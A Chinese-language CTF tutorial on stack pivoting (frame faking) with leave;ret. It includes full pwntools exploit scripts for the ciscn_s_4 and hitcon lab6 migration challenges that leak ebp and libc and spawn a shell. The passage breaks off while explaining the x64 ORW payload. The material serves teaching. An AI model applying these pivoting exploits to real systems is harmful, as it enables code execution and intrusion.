
# frame faking 栈迁移的理解 和 例题详解（含图示）

## 32位

### 原理

- 通过栈溢出或者其他方式控制`EBP`
- 控制`EIP`
- 利用`leave_ret` 使得程序的执行流程被我们所控制

**`leave_ret`：**

```asm
leave:
move esp,ebp;
pop ebp;(esp=esp+4)
```

```asm
ret:
pop eip;
```

栈迁移大概流程图：

![栈迁移](upload/attach/202104/907645_8G6DMDMJTZZMPBZ.jpg)

**关键点：`ebp` 实际上是个寄存器**

### 例题

#### 1. ciscn_4_s

**看程序关键部分**

![image-20210322205202909](upload/attach/202104/907645_3H2S2P3QWUTBSGR.jpg)

- 这里有两个`read`，且都是读入到同一个地方
- `s`可储存的大小为`0x28` 但`read`可读入`0x30`
- `printf %s` 结束符是`'\0'`（所以`read`读入不为空时候，`printf`因为遇见结束符才停止，进而可以泄露`ebp`地址）

![image-20210322205455670](upload/attach/202104/907645_48266X5R64BD382.jpg)

这里还有个后面函数 所以这里调用了`system` 所以我们在后面也可以使用`system`

`0x28`太小不足以用一些好的 ROP

我们如果把`0x28` 全填充为`A` 栈上的布局如图

![image-20210322205820506](upload/attach/202104/907645_CWPM848NFEUXD9R.jpg)

而`printf %s` 要遇见`'\0'` 才会终止 所以我们可以通过`printf` 泄露出`ebp`的地址

从而伪造`ebp` 实现栈迁移

我们先设计一下`exp`

- 有两个`read` 第一个`read` 填充`0x28` 通过`printf %s` 打印出`ebp`地址
- 第二次`read` 读入我们设置的栈布局
- ![image-20210323001556670](upload/attach/202104/907645_GE557WQU4FWK8H6.jpg)

---

**这里流程是 `read` 结束后 要 `leave_ret` 此时 `ebp` -> `fake_ebp_addr`**

![image-20210323003516399](upload/attach/202104/907645_RU9SGPQJ8A7XHY2.jpg)

又将会执行一次 `leave_ret`（即我们放进去的 `leave_ret`）

- `move esp,ebp`；`esp` 和 `ebp` 会指向同一位置
- `pop ebp`；此时`ebp`指向`'AAAA'` 且`esp=esp+4` 指向 `system_plt`
- `pop eip` 把`esp`指向的 `system_plt` 地址填入`EIP`寄存器中
- `system_plt` 下方的`4 * "A"` 是`system_fake_ebp`

![image-20210323003855964](upload/attach/202104/907645_K2VPJYJX7B62P8H.jpg)

**因为第二次 `leave_ret` 同样要 `pop ebp`，`pop ebp` 后 `ebp`=`'AAAA'`**

**同样要`esp=esp+4`，所以前四个字节填`'AAAA'`**

**`system_plt` 放在`buf+4`的地址**

**完成`pop ebp` 后 `esp` -> `system_plt`**

然后程序会按照我们栈布局的内容执行，从而`getshell`

`exp`：

```python
from pwn import *
arch = 32
challenge = "./ciscn_s_4"
local = int(sys.argv[1])
context(log_level = "debug",os = "linux")
if local:
io = process(challenge)
#libc = ELF("./libc.so.6")
elf = ELF(challenge)
else:
io = remote('node3.buuoj.cn',25839)
#libc = ELF("./libc.so.6")
elf = ELF(challenge)
if arch==64:
context.arch='amd64'
if arch==32:
context.arch='i386'
p = lambda : pause()
s = lambda x : success(x)
re = lambda x : io.recv(x)
ru = lambda x : io.recvuntil(x)
rl = lambda : io.recvline()
sd = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
itr = lambda : io.interactive()
sla = lambda a, b : io.sendlineafter(a, b)
sa = lambda a, b : io.sendafter(a, b)
def dbg():
gdb.attach(io)
pause()
system=elf.plt['system']
leave_ret=0x080485FD
#pwnlib.gdb.attach(proc.pidof(io)[0])
payload1='A' * 0x24+'a'*4
ru('name?')
sd(payload1)
ru('aaaa')
ebp=u32(re(4).ljust(4,'\x00'))
print 'epb:'+(hex(ebp))
fake_ebp=ebp-0x38
payload2='AAAA'+p32(system)+'AAAA'+p32(fake_ebp+16)+'/bin/sh\x00'
payload2+='A'*(0x28-len(payload2))+p32(fake_ebp)+p32(leave_ret)
sd(payload2)
pause()
itr()
pause()
```

**`payload` 解释：**

`fake_ebp`：

`GDB`得到`buf_address` = `0xffffce20`

![image-20210331195818490](upload/attach/202104/907645_PYCAKXRF279AC5X.jpg)

得到`ebp` 指向的地址 `[ebp]=0xffffce58`

![image-20210331200131103](upload/attach/202104/907645_K7KJ2F5Q95WRMZX.jpg)

```
offset=0xffffce58 - 0xffffce20 =0x38
```

所以我们只要把泄露出的`ebp` - `0x38` 就让程序流程从布局好的`buf`段上执行

---

#### 2. hitcon-master-lab6

检查保护：

```text
rgzz@ubuntu:~/work/stack/pivoting$ checksec migration
[*] '/home/rgzz/work/stack/pivoting/migration'
Arch: i386-32-little
RELRO: Full RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x8048000)
```

NX enabled，FULL RELRO

再进`IDA` 看看程序流程

![image-20210331202156995](upload/attach/202104/907645_9B3UMWH3QKWEWU7.jpg)

这里`count`是个检查 不好反复栈溢出 `main` 只能跳一次

这里选择通过伪造`ebp` 通过栈转移 进而控制程序执行流程

这里可以溢出大小为 `0x40-0x28=0x18`

因为我们每次只能读入`0x40` 个字节 所以`payload`要分开写

**`payload1`：**

```
payload1=flat([0x28 * 'A',bss+0x500,read_plt, leave_ret,0,bss+0x500,0x100])
```

这里`payload1` 刚好大小`0x40`

我们先找到一段可以写的`bss`段 然后把`bss+0x500`地址作为`fake_ebp`

`fake_ebp`就是我们新的`stack`起始

通过把`return_address` 地址覆盖为`read_plt` 进而调用`read` 向新的`stack` 写入我们的`payload2`

`gdb` 跟一下：

跟到第一个`read`后发现`ebp` 已经被我们虚假`fake_ebp`覆盖了（`buf_addr` 就是找到`bss`段+`0x500`）

![image-20210401014334255](upload/attach/202104/907645_NXPPZFYR5TCGR8Q.jpg)

马上程序会执行第个`read` (1)

第`read(1)` 读入`puts.plt`，因为没有现成的`system`函数可以调用，这里选择通过`puts`泄露`libc`基址

泄露后继续利用`read(2)` 读入 `system` 地址和`'/bin/sh'` 从而实现`get shell`

因为我们要跳到我们填`system_address` 的地址上所以`fake_ebp2=bss+0x400=read(2)`读入数据存放地址

当`read(2)`结束后通过`leave_ret` 跳到`bss+0x400`上 进而执行`system("/bin/sh")`

**`payload2`：**

```python
payload2 = flat([bss+0x400
,puts_plt
,pop_ebx_ret
,puts_got
,read_plt
,leave_ret
,0
,bss+0x400
,0x100
])
```

**`payload3`：**

```python
payload3 = flat(["aaaa",system,bbbb,binsh_addr])
```

- `pop_ebx_ret` 因为每次调用`function.plt` 要有返回地址 `pop_ebx_ret` 用于链接`payload2`流程
- 若`pop_ebx_ret` 填为 `puts_fake_plt='AAAA'` 则就不能正常执行下面的`read(2)`

**图示栈布局程序流程：**

![未命名文件](upload/attach/202104/907645_TZJSHX5M5835SQF.jpg)

**`exp` 如下**

```python
from pwn import *
arch = 32
challenge = "./migration"
local = int(sys.argv[1])
context(log_level = "debug",os = "linux")
if local:
io = process(challenge)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF(challenge)
else:
io = remote('',)
#libc = ELF("./libc.so.6")
elf = ELF(challenge)
if arch==64:
context.arch='amd64'
if arch==32:
context.arch='i386'
p = lambda : pause()
s = lambda x : success(x)
re = lambda x : io.recv(x)
ru = lambda x : io.recvuntil(x)
rl = lambda : io.recvline()
sd = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
itr = lambda : io.interactive()
sla = lambda a, b : io.sendlineafter(a, b)
sa = lambda a, b : io.sendafter(a, b)
def dbg():
gdb.attach(io)
pause()
read_plt = elf.plt['read']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
bss = elf.bss()
leave_ret = 0x08048504
pop_ebp_ret = 0x0804836d
print 'buf addr:'+hex(bss+0x500)
print 'puts_got:'+hex(puts_got)
ru(':\n')
payload1 = flat([0x28 * 'A', bss+0x500, read_plt, leave_ret, 0, bss+0x500,0x100])
sd(payload1)
#dbg()
payload2 = flat([bss+0x400, puts_plt, pop_ebp_ret, puts_got, read_plt, leave_ret, 0, bss+0x400,0x100])
sd(payload2)
puts = u32(io.recv(4))
print 'puts address:'+hex(puts)
libc.address = puts - libc.symbols['puts']
binsh_addr = next(libc.search('/bin/sh'))
system = libc.symbols['system']
payload3 = flat(['AAAA',system,'bbbb',binsh_addr])
sd(payload3)
itr()
```

![image-20210323185422402](upload/attach/202104/907645_SPR5PMNQ3G3B2SN.jpg)

`exp` 中的`pop_ebx_ret` 是为了弹出在栈上的`puts_got` 好正常执行 `read(0,bss+0x400,0x100)`

因为`read` 的参数是由栈上获取的

题目下载地址：

<mark class="encrypted">08fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6Z5k6h3u0@1N6h3g2J5M7X3!0J5y4o6l9@1i4K6u0r3b7#2c8r3i4K6g2X3j5$3!0E0M7r3g2@1K9i4c8A6L8$3&6Q4y4h3k6%4j5i4u0W2K9r3!0#2M7$3g2Q4y4h3j5J5x3o6t1H3i4K6g2X3c8X3W2J5M7%4c8Q4x3V1k6@1M7Y4g2F1K9#2)9J5c8W2u0a6f1q4)9#2k6V1I4q4g2V1g2x3x3R3`.`.</mark>

### 总结（1）

- 通过`read` 等函数，用`fake frame` 覆盖原本`ebp`
- 通过`leave_ret` 方法 使程序跳到我们布局好的`bss`/`stack` 段上 进而控制程序流程进而`get_shell` 或者 `orw` 得到 `flag`

---

## x64

### 原理

- 原理和x86的栈迁移的原理一致 都是通过制造`fake ebp` 来将栈转移到我们布置的地址空间上
- 从而控制程序执行流程

**区别：x64要通过`gadget` 填入参数**

### 例题：hgame 2020 week3 ROP_level2

**先看保护：**

![image-20210408170339500](upload/attach/202104/907645_AGGDQ8A5FUPF6RY.jpg)

NX enabled

**`main` function：**

![image-20210408170435550](upload/attach/202104/907645_HZTMDGAGV8JEZNP.jpg)

发现可以向`buf` 地址写内容

有两个`read` 第一个`read` 可以读`0x100` 且是向`buf`地址写内容（`buf` 在`bss`段上）

所以我们可以把栈布局在`buf`上 然后通过第二个`read` 制造一个`fake ebp` 从而实现栈迁移

把栈执行流程转移到我们之前布局的地址上

这里还发现有`seccomp` 禁用了`execve()`

![image-20210408170938440](upload/attach/202104/907645_MJUW2CHR3TS8MEQ.jpg)

所以这里就通过`orw` 来直接读`flag`了

因为这里利用`gadget`，所以我们先寻找`gadget`，我们发现`rdi` 和 `rsi` 都可以控制，但是`rdx`不行

后话：（这里调试发现`rdx`参数是之前`read`的`0x60`无影响）

这里我们选择利用`libc_csu_init` 通用`gadget` 来控制参数，刚好就利用栈迁移+`orw`+`libc_csu_init` 通用`gadget`

![image-20210408171539569](upload/attach/202104/907645_GEDTNM5FUZ2G45E.jpg)

**利用总结：**

- 通过第一个`read` 读入栈布局 通过`libc_csu_init` 给`open`，`read`，`put` 填入参数
- 通过第二个`read` 读入`junk_data` 伪造`fake_ebp` 使栈转移到我们刚刚布局的地址上
- 利用`puts` 打印`flag`（`puts`只需要控制一个参数）

#### `payload1` 分成三段来解释：
